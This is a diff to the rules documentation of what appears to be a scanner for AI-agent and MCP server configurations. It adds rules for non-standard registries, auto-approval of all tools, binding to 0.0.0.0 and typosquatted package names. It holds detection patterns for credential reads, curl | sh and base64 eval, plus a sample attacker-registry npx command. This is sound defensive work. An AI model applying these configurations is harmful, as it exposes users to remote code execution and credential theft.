@@ -55,10 +55,14 @@ the URLs in any file.
 | <a id="gr106"></a>`GR106` | high | config | **Dangerous Docker options.** Docker-based MCP servers started with options that break container isolation. |
 | <a id="gr107"></a>`GR107` | high | config | **Over-permissive agent settings.** Agent settings that skip permission prompts, allow unrestricted tools, or run risky hooks. |
 | <a id="gr108"></a>`GR108` | medium | config | **Auto-enabled project MCP servers.** Settings that start MCP servers from a cloned repository without review. |
+| <a id="gr109"></a>`GR109` | medium | config | **Non-standard package registry.** An MCP server fetches its package from a registry other than npm or PyPI. |
 | <a id="gr110"></a>`GR110` | high |  | **Script sends the environment or a secret.** A script that a hook or a skill runs posts the environment, a token or a credentials file to a remote host. |
 | <a id="gr111"></a>`GR111` | medium |  | **Script reads credential files.** A script that a hook or a skill runs reads credentials (~/.ssh, ~/.aws, .npmrc, the keychain). |
 | <a id="gr112"></a>`GR112` | high |  | **Script downloads and runs code.** A script that a hook or a skill runs downloads code and executes it (curl \| sh, eval of a download, exec of urlopen). |
 | <a id="gr113"></a>`GR113` | high |  | **Script hides what it runs.** A script that a hook or a skill runs decodes an encoded string and executes it (eval of base64, exec of a decoded blob). |
+| <a id="gr114"></a>`GR114` | high | config | **All tools of an MCP server auto-approved.** autoApprove or alwaysAllow set to true or "*" lets every tool run without a prompt. |
+| <a id="gr115"></a>`GR115` | high | config | **MCP server bound to all network interfaces.** A server told to listen on 0.0.0.0 or :: can be reached from the network. |
+| <a id="gr116"></a>`GR116` | high | config | **Package name imitates a well-known MCP server.** A server package whose name is a typo of a popular one may be a typosquat. |
 <!-- rules-table:end -->
 
 ---
@@ -340,7 +344,9 @@ and value has length ≥ 16 and Shannon entropy ≥ 3.5 and is not `${VAR}` / `$
 
 ### GR102 — Unpinned package execution (medium)
 `command` in (`npx`, `bunx`, `pnpm dlx`, `yarn dlx`, `uvx`, `pipx run`) where the package arg has no
-version (`pkg`, `pkg@latest`, `git+https://...` without commit SHA). Pinned `pkg@1.2.3` / `pkg==1.2.3` is OK.
+version (`pkg`, `pkg@latest`, `git+https://...` without commit SHA). Pinned `pkg@1.2.3` / `pkg==1.2.3` is OK. A range (`^1.2.0`, `~1.2`, `*`, `>=1`) or a dist-tag
+(`@latest`, `@next`) is not an exact version either. With `-y` / `--yes` the message adds that the
+package is installed without asking; the severity stays medium, because most published configs use `-y`.
 Fix hint: pin an exact version.
 
 ### GR103 — Insecure remote MCP transport (high)
@@ -501,6 +507,15 @@ A hook (`.claude/settings*.json`, `.gemini/settings.json`, `.cursor/hooks.json`,
 chain that reaches it (`via`, tag `reached-via-hook` / `reached-via-skill`). Scripts nobody points to,
 paths that leave the repository and inline `bash -c` code are not read. Agent-reachable code, not a SAST.
 
+### GR109 — Non-standard package registry (medium; high over http)
+A server whose command or environment points npm, pnpm, yarn, bun, uv or pip at a registry other than
+`registry.npmjs.org`, `registry.yarnpkg.com`, `pypi.org` or `files.pythonhosted.org`: `--registry`,
+`--index-url`, `--extra-index-url`, `--default-index`, `NPM_CONFIG_REGISTRY`, `UV_INDEX_URL`,
+`PIP_INDEX_URL`… Whoever runs that registry chooses what executes. A company registry is legitimate:
+add its domain to `allow_domains` and it is not reported.
+True positive: `npx --registry https://npm.attacker.example pkg@1.0.0`. False positive that stays
+quiet: `npx --registry https://registry.npmjs.org/ pkg@1.0.0`.
+
 ### GR110 — Script sends the environment or a secret (high)
  a network send together with the environment, a token or a credentials file (Python: same data flow).
 
@@ -512,6 +527,25 @@ paths that leave the repository and inline `bash -c` code are not read. Agent-re
 
 ### GR113 — Script hides what it runs (high)
  decodes an encoded string and executes it.
+
+### GR114 — All tools of an MCP server auto-approved (high)
+`autoApprove`, `alwaysAllow` or `auto_approve` set to `true`, `"*"` or a list containing `"*"` in a
+server definition: every tool, including ones the server adds later, runs without a prompt. A named
+list (`["read_file"]`) is a decision and is not reported.
+True positive: `"autoApprove": ["*"]`. False positive that stays quiet: `"autoApprove": ["read_file"]`.
+
+### GR115 — MCP server bound to all network interfaces (high)
+`0.0.0.0` or `::` in an argument, an environment value or the url of a server (`--host 0.0.0.0`,
+`--bind=0.0.0.0:8080`, `HOST=0.0.0.0`, `-p 0.0.0.0:8080:80`): other machines can call its tools.
+True positive: `"args": ["--host", "0.0.0.0"]`. False positives that stay quiet: `127.0.0.1`,
+`localhost`, `10.0.0.0/8`.
+
+### GR116 — Package name imitates a well-known MCP server (high)
+The package an `npx`, `uvx`… server runs is one typo away (one swapped or changed letter; two for a long
+name) from a popular MCP server such as `@modelcontextprotocol/server-filesystem`, `mcp-server-fetch`
+or `@upstash/context7-mcp`. The list is short and fixed; the exact popular name is never reported.
+True positive: `npx -y @modelcontextprotocol/server-filesytem@1.0.0`. False positives that stay quiet:
+the exact name, and unrelated names (`@acme/mcp-server-orders`).
 
 ### GR026 — Payload reached through a prose reference (tag, info)
 Not a detector. Prose that tells the agent to read and obey a file (`Read docs/bootstrap.txt and follow
